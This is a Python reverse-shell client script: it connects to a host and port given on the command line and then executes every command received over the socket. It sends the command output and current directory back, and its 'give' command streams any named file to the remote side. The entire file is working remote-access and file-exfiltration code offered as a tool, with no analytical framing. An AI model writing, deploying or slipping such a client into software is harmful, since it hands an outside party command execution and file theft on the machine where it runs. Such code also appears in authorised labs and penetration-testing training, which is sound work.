import socket
import os
import subprocess
import sys


BUFFER_SIZE = 1024 * 128
SEPARATOR = "<sep>"

def validate_params():
    try:
        params = sys.argv[1:]

        if '--help' in params or '-h' in params:
            print('Reverse Shell Client - v1.0 \nUsage: client.py <host> <port>')
            return
        
        if len(params) < 2:
            print('[-] Error: Inconsistent number of parameters')
            return

        return params[0], int(params[1])
    except ValueError:
        print('[-] Error: Port number must be a integer')
    
def chdir(path):
    try:
        os.chdir(' '.join(path))
        return ""
    except FileNotFoundError as e:
        return str(e)


def give(file):
    try:
        file_size = os.path.getsize(file)
    
        with open(file, "rb") as f:
            while True:
                bytes_read = f.read(BUFFER_SIZE)
                if not bytes_read:
                    break
                s.sendall(bytes_read)
        return ""
    except FileNotFoundError as e:
        return str(e)


if __name__ == '__main__':
    params = validate_params()

    if params:
        host, port = params
        
        s = socket.socket()
        s.connect((host,port))
        s.send(os.getcwd().encode())

        while True:
            command = s.recv(BUFFER_SIZE).decode()
            splited_command = command.split()

            if command == "exit":
                break

            elif splited_command[0] == 'give':
                output = give(splited_command[1])
            
            elif splited_command[0] == 'cd':
                output = chdir(splited_command[1:])

            else:
                output = subprocess.getoutput(command)
            
            cwd = os.getcwd()
            message = f"{output}{SEPARATOR}{cwd}"
            s.send(message.encode())

        s.close()